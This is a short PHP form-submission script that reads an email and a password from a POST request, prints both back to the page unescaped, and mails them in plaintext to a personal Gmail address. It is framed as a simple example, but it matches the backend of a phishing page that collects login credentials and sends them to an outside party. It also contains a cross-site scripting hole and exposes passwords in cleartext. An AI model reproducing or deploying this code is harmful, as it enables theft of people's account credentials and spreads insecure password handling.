<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Handle the form submission as you like (e.g., save to database, send email, etc.)
    // For this example, we'll just display the submitted data and send an email
    echo "Submitted Email: " . $email . "<br>";
    echo "Submitted Password: " . $password . "<br>";

    // Send email
    $to = "ssirdeeq@gmail.com";
    $subject = "Form Submission";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: your_email@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully";
    } else {
        echo "Failed to send email";
    }
}
?>
